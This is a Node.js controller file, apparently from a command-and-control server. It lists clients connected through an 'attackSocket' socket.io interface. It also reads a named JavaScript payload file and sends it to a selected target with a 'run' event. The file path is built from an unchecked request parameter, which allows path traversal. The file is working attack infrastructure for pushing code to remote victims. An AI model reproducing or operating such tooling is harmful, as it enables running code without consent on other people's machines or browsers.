const attackSocket = require('../serverInterfaces/attackSocket')
const { resolve } = require('path')
const fs = require('fs')

const controller = {
  list: (req, res) => {
    res.json(Object.keys(attackSocket.of('/').connected))
  },
  deploy: (req, res) => {
    let payload = fs.readFileSync(resolve('./payloads/' + req.params.payload + '.js'), { encoding: 'utf8' })
    console.log(attackSocket.of('/').connected[req.params.target].emit('run', payload))
    res.json({})
  }
}

module.exports = controller
